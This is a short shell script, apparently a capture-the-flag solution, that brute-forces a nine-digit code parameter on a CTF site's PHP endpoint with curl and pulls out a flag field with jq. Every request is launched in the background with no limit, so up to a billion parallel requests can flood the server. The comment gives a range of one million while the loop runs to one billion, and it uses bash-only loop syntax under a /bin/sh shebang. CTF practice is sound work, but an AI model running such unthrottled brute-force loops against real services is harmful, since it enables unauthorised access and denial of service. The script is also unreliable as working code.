#!/bin/sh
export LANG=en_US.UTF-8

# Loop through numbers from 0 to 1000000 and send a GET request for each number
for ((i=0; i<1000000000; i++)); do
    # Construct the URL with the number as a parameter
    url="https://ctf.wardsegers.be/spring.php?code=$(printf %09d $i)"
    
    # Send the GET request using curl
    curl -s "$url" | jq 'if ."🏳️" != "" then ."🏳️" else empty end' &
done
wait
